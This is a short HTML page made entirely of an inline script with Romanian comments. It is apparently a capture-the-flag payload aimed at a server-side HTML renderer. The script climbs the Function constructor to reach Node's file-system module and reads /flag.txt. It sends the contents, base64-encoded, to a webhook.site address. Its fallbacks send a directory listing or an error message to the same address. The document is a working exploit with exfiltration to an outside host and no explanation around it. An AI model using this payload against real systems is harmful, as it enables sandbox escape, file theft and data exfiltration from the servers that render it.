<!DOCTYPE html>
<html>
<body>
    <script>
        (async () => {
            try {
                // Încercăm să încărcăm modulul de sistem pentru fișiere (fs)
                const fs = new Function("return (async () => {}).constructor('return require(\"fs\")')()")();
                
                // Citim conținutul fișierului flag.txt
                const flag = fs.readFileSync('/flag.txt', 'utf8');

                // Îl trimitem către Webhook
                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?CONTS_FISIER=" + btoa(flag));
            } catch (e) {
                // Dacă nu putem citi fișierul, încercăm să listăm măcar fișierele din folderul curent
                try {
                    const fs2 = new Function("return (async () => {}).constructor('return require(\"fs\")')()")();
                    const files = fs2.readdirSync('.').join(',');
                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?LISTA_DOCS=" + btoa(files));
                } catch (e2) {
                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?ULTIMA_EROARE=" + btoa(e2.message));
                }
            }
        })();
    </script>
</body>
</html>
